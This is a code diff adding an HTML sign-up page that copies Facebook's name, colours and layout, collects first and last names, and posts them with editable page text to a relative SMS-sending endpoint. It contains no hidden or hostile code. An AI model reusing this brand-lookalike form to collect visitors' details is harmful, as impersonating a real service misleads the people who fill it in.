@@ -1,0 +1,415 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Sign Up</title>
+
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      font-family: Helvetica, Arial, sans-serif;
+      background: #f0f2f5;
+      color: #1c1e21;
+    }
+
+    .page {
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 40px 20px;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 980px;
+      display: grid;
+      grid-template-columns: 1fr 396px;
+      gap: 70px;
+      align-items: center;
+    }
+
+    /* Left side */
+    .intro {
+      margin-top: -30px;
+    }
+
+    .logo {
+      color: #1877f2;
+      font-size: 52px;
+      font-weight: bold;
+      letter-spacing: -2px;
+      margin-bottom: 10px;
+    }
+
+    .editable-title {
+      font-size: 28px;
+      line-height: 1.25;
+      font-weight: 400;
+      margin: 0 0 14px;
+      outline: none;
+      cursor: text;
+    }
+
+    .editable-title:focus,
+    .editable-description:focus {
+      outline: 2px solid #1877f2;
+      outline-offset: 5px;
+      border-radius: 4px;
+    }
+
+    .editable-description {
+      font-size: 18px;
+      line-height: 1.5;
+      margin: 0;
+      max-width: 520px;
+      outline: none;
+      cursor: text;
+    }
+
+    .edit-hint {
+      margin-top: 18px;
+      color: #65676b;
+      font-size: 13px;
+    }
+
+    /* Sign-up card */
+    .card {
+      background: white;
+      border-radius: 8px;
+      padding: 18px;
+      box-shadow:
+        0 2px 4px rgba(0, 0, 0, .1),
+        0 8px 20px rgba(0, 0, 0, .08);
+    }
+
+    .card h2 {
+      margin: 0 0 4px;
+      font-size: 25px;
+    }
+
+    .card-subtitle {
+      color: #606770;
+      font-size: 15px;
+      margin: 0 0 16px;
+    }
+
+    .divider {
+      height: 1px;
+      background: #dddfe2;
+      margin: 18px 0;
+    }
+
+    .name-row {
+      display: flex;
+      gap: 8px;
+    }
+
+    input {
+      width: 100%;
+      padding: 14px 12px;
+      border: 1px solid #ccd0d5;
+      border-radius: 6px;
+      font-size: 16px;
+      margin-bottom: 10px;
+      background: #fff;
+    }
+
+    input:focus {
+      border-color: #1877f2;
+      outline: none;
+      box-shadow: 0 0 0 2px #e7f3ff;
+    }
+
+    .submit-button {
+      width: 100%;
+      border: 0;
+      border-radius: 6px;
+      background: #42b72a;
+      color: white;
+      font-size: 18px;
+      font-weight: bold;
+      padding: 12px;
+      cursor: pointer;
+      transition: background .2s;
+    }
+
+    .submit-button:hover {
+      background: #36a420;
+    }
+
+    .submit-button:disabled {
+      opacity: .6;
+      cursor: not-allowed;
+    }
+
+    .status {
+      display: none;
+      margin-top: 12px;
+      padding: 10px;
+      border-radius: 6px;
+      font-size: 14px;
+      text-align: center;
+    }
+
+    .status.success {
+      display: block;
+      background: #e9f7e5;
+      color: #26731a;
+    }
+
+    .status.error {
+      display: block;
+      background: #ffebe8;
+      color: #b42318;
+    }
+
+    .footer {
+      text-align: center;
+      color: #737373;
+      font-size: 12px;
+      margin-top: 22px;
+    }
+
+    @media (max-width: 800px) {
+      .container {
+        grid-template-columns: 1fr;
+        gap: 35px;
+        max-width: 500px;
+      }
+
+      .intro {
+        text-align: center;
+        margin-top: 0;
+      }
+
+      .editable-description {
+        margin-left: auto;
+        margin-right: auto;
+      }
+
+      .logo {
+        font-size: 44px;
+      }
+    }
+
+    @media (max-width: 420px) {
+      .name-row {
+        flex-direction: column;
+        gap: 0;
+      }
+
+      .page {
+        padding: 25px 12px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <main class="page">
+    <div class="container">
+
+      <!-- LEFT CONTENT -->
+      <section class="intro">
+        <div class="logo">facebook</div>
+
+        <!-- Click these elements to edit them -->
+        <h1
+          class="editable-title"
+          id="pageTitle"
+          contenteditable="true"
+          spellcheck="true"
+        >
+          Connect with friends and the world around you.
+        </h1>
+
+        <p
+          class="editable-description"
+          id="pageDescription"
+          contenteditable="true"
+          spellcheck="true"
+        >
+          Create an account to connect with people, share what's happening,
+          and stay in touch with the people who matter to you.
+        </p>
+
+        <div class="edit-hint">
+          Click the title or description to edit the text.
+        </div>
+      </section>
+
+
+      <!-- TOP-RIGHT SIGN-UP FORM -->
+      <section>
+        <form class="card" id="signupForm">
+
+          <h2>Sign Up</h2>
+          <p class="card-subtitle">
+            It's quick and easy.
+          </p>
+
+          <div class="divider"></div>
+
+          <div class="name-row">
+            <input
+              type="text"
+              id="firstName"
+              name="firstName"
+              placeholder="First name"
+              autocomplete="given-name"
+              required
+            />
+
+            <input
+              type="text"
+              id="lastName"
+              name="lastName"
+              placeholder="Last name"
+              autocomplete="family-name"
+              required
+            />
+          </div>
+
+          <button
+            type="submit"
+            class="submit-button"
+            id="submitButton"
+          >
+            Sign Up
+          </button>
+
+          <div id="status" class="status"></div>
+
+        </form>
+
+        <div class="footer">
+          By signing up, you agree to our terms and policies.
+        </div>
+      </section>
+
+    </div>
+  </main>
+
+
+  <script>
+    /*
+      ----------------------------------------------------------
+      CONFIGURATION
+      ----------------------------------------------------------
+
+      Your server should expose an endpoint such as:
+
+          POST /api/send-sms
+
+      The server receives:
+
+          {
+            firstName: "...",
+            lastName: "...",
+            title: "...",
+            description: "..."
+          }
+
+      The server is responsible for delivering the message
+      through your chosen SMS/email provider.
+
+      DO NOT put API keys or SMS-provider credentials here.
+    */
+
+    const SMS_ENDPOINT = "/api/send-sms";
+
+
+    // Make edited title/description available to the form.
+    const titleElement = document.getElementById("pageTitle");
+    const descriptionElement = document.getElementById("pageDescription");
+
+    const form = document.getElementById("signupForm");
+    const submitButton = document.getElementById("submitButton");
+    const status = document.getElementById("status");
+
+
+    function showStatus(message, type) {
+      status.textContent = message;
+      status.className = "status " + type;
+    }
+
+
+    form.addEventListener("submit", async function (event) {
+      event.preventDefault();
+
+      const firstName =
+        document.getElementById("firstName").value.trim();
+
+      const lastName =
+        document.getElementById("lastName").value.trim();
+
+      const title =
+        titleElement.innerText.trim();
+
+      const description =
+        descriptionElement.innerText.trim();
+
+
+      if (!firstName || !lastName) {
+        showStatus("Please enter your first and last name.", "error");
+        return;
+      }
+
+
+      submitButton.disabled = true;
+      submitButton.textContent = "Sending...";
+
+      try {
+        const response = await fetch(SMS_ENDPOINT, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            firstName,
+            lastName,
+            title,
+            description
+          })
+        });
+
+
+        if (!response.ok) {
+          throw new Error("Request failed");
+        }
+
+
+        showStatus(
+          "Thanks! Your information has been sent.",
+          "success"
+        );
+
+        form.reset();
+
+      } catch (error) {
+
+        console.error(error);
+
+        showStatus(
+          "Unable to send the information. Please try again.",
+          "error"
+        );
+
+      } finally {
+
+        submitButton.disabled = false;
+        submitButton.textContent = "Sign Up";
+
+      }
+    });
+  </script>
+
+</body>
+</html>
